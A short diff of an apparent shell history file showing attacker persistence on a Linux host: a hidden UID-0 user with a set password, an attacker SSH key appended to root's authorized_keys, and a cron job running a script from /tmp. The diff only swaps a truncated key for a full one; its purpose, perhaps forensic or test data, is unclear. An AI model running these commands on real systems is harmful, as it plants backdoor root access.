@@ -35,7 +35,7 @@ useradd -o -u 0 -g 0 -M -s /bin/bash sysupd
 #1790962132
 echo 'sysupd:Upd@te99' | chpasswd
 #1790962170
-echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7xq attacker@kali' >> /root/.ssh/authorized_keys
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILNdmmt6c4gjxIOrMzjBuZ9GhLS4en5u7O0hZdhu935Z attacker@kali' >> /root/.ssh/authorized_keys
 #1790962205
 (crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.x/k.sh') | crontab -
 #1790962280
